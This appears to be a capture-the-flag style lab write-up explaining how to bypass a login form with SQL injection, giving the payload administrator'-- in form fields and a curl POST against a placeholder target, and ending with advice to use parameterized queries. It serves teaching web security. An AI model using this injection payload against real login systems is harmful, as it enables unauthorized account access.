# SQL injection vulnerability allowing login bypass — Apprentice

**Status:** Solved

---

## Goal

Exploit a SQL injection vulnerability in the login form to bypass authentication and log in as the administrator user without knowing the password.

---

## Steps (simple & complete)

1. **Navigate to the login page**
   - Find the login functionality on the application
   - You'll see username and password fields

2. **Understand the backend query**
   - The login likely uses a query like:
```sql
   SELECT * FROM users WHERE username = 'admin' AND password = 'entered_password'
```
   - If a row is returned, login succeeds

3. **Test for SQL injection**
   - Try entering a single quote in the username field:
```
   Username: admin'
   Password: anything
```
   - If you get an error or unusual behavior, it's vulnerable

4. **Craft the SQL injection payload**
   - We need to:
     - Close the username string with `'`
     - Comment out the password check using `--`
   - Username payload:
```
   administrator'--
```
   - Password: (leave empty or type anything)

5. **Execute the login bypass**
   - Enter in the login form:
```
   Username: administrator'--
   Password: (anything or blank)
```
   - Click "Log in"

6. **How it works**
   - Original query:
```sql
   SELECT * FROM users WHERE username = 'administrator' AND password = 'whatever'
```
   - After injection:
```sql
   SELECT * FROM users WHERE username = 'administrator'--' AND password = 'whatever'
```
   - The `--` comments out the password check
   - Query becomes: check if username 'administrator' exists
   - Returns the admin user row → authentication bypassed!

7. **Verify success**
   - You'll be logged in as the administrator
   - Lab automatically solves once you're authenticated as admin

---

## Example

- Login form injection:
```
Username: administrator'--
Password: password
```

- Or using curl:
```bash
curl -s "https://TARGET/login" \
  -d "username=administrator'--&password=anything" \
  -X POST
```

---

## Why this works

The application builds the SQL query by concatenating user input directly into the query string. By adding `'--` after the username, we close the username string and comment out everything that follows, including the password verification. This is why you should never trust user input and always use parameterized queries or prepared statements. The `--` tells SQL "ignore everything after this point", effectively removing the password check from the authentication logic.

---

s